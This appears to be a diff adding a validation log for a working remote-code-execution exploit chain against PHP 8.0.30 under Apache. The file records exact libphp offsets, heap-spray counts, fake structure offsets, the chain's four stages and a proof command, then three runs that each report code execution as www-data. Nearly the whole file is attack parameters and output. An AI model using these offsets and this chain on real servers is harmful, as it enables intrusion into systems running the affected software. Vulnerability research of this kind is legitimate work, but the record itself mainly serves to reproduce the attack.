@@ -1,0 +1,87 @@
+validation_date=2026-10-24
+profile=php-8.0.30-apache-amd64-trans-sid
+target_repo_digest=mirror.gcr.io/library/php@sha256:c87b4c94d53b35520467b6d026f38656ab9a6d446fa3a0fbba1bc633125f9ad2
+target_image_id=sha256:3357132d6ece3a509ce6f8abf6e7cf9886b343c504cb58428a7302cbe7abe446
+php=8.0.30
+apache=2.4.56
+libphp_sha256=0f2d31b76eb19814dc88e2a0cc7d57fe7f116168df8f8857fa9150fb5b5f7949
+libphp_build_id=22ea5e392e39c122039896feb5c9c52b75846581
+zif_system_offset=0x3495d0
+zval_ptr_dtor_offset=0x4319a0
+memory_limit=108M
+post_max_size=192M
+upload_max_filesize=192M
+apache_prefork_workers=1
+network_internal=true
+published_ports=false
+process_memory_access=false
+ptrace=false
+gdb=false
+proof_command=id>/out/p
+runs=3/3
+terminal_symbol=zif_system
+terminal_offset=0x3495d0
+b1_dtor_hits=2117
+b2_http_response=empty
+chain=A1 FILE_START OOM; B1 4MiB trans-SID heap/libphp disclosure; A2 streamed scalar OOM with 64 fillers; B2 short-SID fixed zend_reference/HashTable reclaim
+a1_raw_sid_offset=0x126260
+b1_leak_length=0x400000
+b1_main_qword_offset=0xd9d88
+a2_filler_count=64
+b2_session_value=a
+b2_reference_offset=0x7d960
+b2_fake_array_offset=0x7d800
+b2_spray_count=400
+b2_field_name_length=4
+b2_field_value_length=4071
+post_proof_worker=crash-after-exec; connection closed without normal B2 HTTP status
+success_criterion=fresh /out/p contains uid=<number>; connection close alone is not success
+packaged_runner_regression=pass
+packaged_runner_run_id=20261023T180015Z-636870
+packaged_runner_exit=0
+packaged_runner_proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+verification_runs_excluding_regression=3
+
+run=1
+artifact=b2-root-fill64-7d960-1
+fresh_aslr=true
+fresh_target=true
+a1_status=500
+b1_status=200
+b1_leak_length=0x400000
+a2_status=500
+b2_status=none
+main_chunk=0x7b34f1200000
+libphp_base=0x7b34f1678000
+zval_ptr_dtor_hits=2117
+proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+run=2
+artifact=b2-root-fill64-7d960-2
+fresh_aslr=true
+fresh_target=true
+a1_status=500
+b1_status=200
+b1_leak_length=0x400000
+a2_status=500
+b2_status=none
+main_chunk=0x70e9f8800000
+libphp_base=0x70e9f8bce000
+zval_ptr_dtor_hits=2117
+proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+run=3
+artifact=b2-root-fill64-7d960-3
+fresh_aslr=true
+fresh_target=true
+a1_status=500
+b1_status=200
+b1_leak_length=0x400000
+a2_status=500
+b2_status=none
+main_chunk=0x74260e200000
+libphp_base=0x74260e62b000
+zval_ptr_dtor_hits=2117
+proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+result=3/3 final zif_system fixed-command HTTP-only RCE proofs
